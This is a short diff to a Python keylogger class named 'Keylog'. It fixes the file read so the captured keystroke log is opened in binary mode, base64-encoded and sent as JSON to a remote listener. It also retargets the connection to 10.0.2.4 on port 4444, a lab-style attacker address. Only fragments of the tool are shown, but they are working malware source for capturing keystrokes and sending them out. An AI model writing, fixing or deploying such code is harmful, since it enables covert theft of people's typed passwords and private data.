@@ -32,7 +32,7 @@ class Keylog():
             keylog.join()
 
     def content_logfile(self):
-        with open("error","a") as file:
+        with open("error","rb") as file:
             return base64.b64encode(file.read())
     
     def json_send(self,data):
@@ -60,5 +60,5 @@ class Keylog():
             elif command == '2':
                 exit()
     
-listen = Keylog("1.1.1.1",8080)
+listen = Keylog("10.0.2.4",4444)
 listen.log_listen()
